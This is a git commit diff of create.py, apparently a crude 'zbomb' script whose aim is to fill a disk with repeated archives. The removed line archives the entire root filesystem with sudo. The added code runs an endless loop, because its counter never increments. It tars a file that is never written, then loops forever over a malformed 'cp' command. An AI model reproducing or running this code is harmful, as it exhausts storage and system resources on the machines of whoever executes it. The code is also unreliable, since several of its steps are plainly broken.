c5f974f768598ec3c79d064129374f399e3263ef
Benji <97198967+BenPI88@users.noreply.github.com>
2023-02-26 11:09:55 -0600

    Update create.py

--- create.py
+++ create.py
@@ -1,5 +1,15 @@
 import os
-os.system('sudo tar -zcvf zbomb1.tar.gz /*')
+import string
+import random
+i = 0
+rndstr = ""
+while not i == 10000:
+  os.system("clear")
+  rndstr = rndstr + string.ascii_uppercase[random.randint(0, len(string.ascii_uppercase)) - 1]
+  print("Generating Random String...")
+  print(str(i) + "/10000")
+os.system("clear")
+os.system('sudo tar -zcvf zbomb1.tar.gz rndstr.txt')
 while True:
   os.system('mkdir zbomb && cp zbomb1.tar.gz')
   i = 1
